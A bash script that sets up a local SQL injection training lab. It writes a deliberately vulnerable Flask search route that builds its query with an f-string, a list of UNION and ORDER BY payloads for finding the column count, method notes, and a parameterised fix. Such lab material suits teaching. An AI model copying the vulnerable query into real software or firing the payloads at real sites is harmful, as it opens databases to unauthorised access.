#!/usr/bin/env bash

set -e

BASE="/home/karime/portswigger_labs/sqli/01-union-based/02-union-column-count"

echo "[+] Building UNION column count lab..."

mkdir -p "$BASE"/{vuln,exploit,notes,fix,payloads,automation,reports,db}

# =========================
# README
# =========================
cat > "$BASE/README.md" << 'EOF'
# 02 — UNION Column Count Discovery

Learn how to determine correct column count for UNION SQLi.
EOF

# =========================
# VULN
# =========================
cat > "$BASE/vuln/vuln.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/search")
def search():

    q = request.args.get("q", "")

    conn = sqlite3.connect("store.db")
    cur = conn.cursor()

    query = f"""
        SELECT id, name, price
        FROM products
        WHERE name LIKE '%{q}%'
    """

    print("[SQL]", query)

    return {"results": cur.execute(query).fetchall()}

if __name__ == "__main__":
    app.run(debug=True)
EOF

# =========================
# EXPLOIT
# =========================
cat > "$BASE/exploit/payloads.txt" << 'EOF'
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

' UNION SELECT NULL,'X',NULL--
EOF

# =========================
# NOTES
# =========================
cat > "$BASE/notes/methodology.txt" << 'EOF'
1. Use ORDER BY to find column count
2. Confirm with UNION SELECT NULLs
3. Replace NULL with test string to find reflection
EOF

# =========================
# FIX
# =========================
cat > "$BASE/fix/fix.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/search")
def search():

    q = request.args.get("q", "")

    conn = sqlite3.connect("store.db")
    cur = conn.cursor()

    query = """
        SELECT id, name, price
        FROM products
        WHERE name LIKE ?
    """

    return {
        "results": cur.execute(query, (f"%{q}%",)).fetchall()
    }
EOF

echo "[+] DONE"
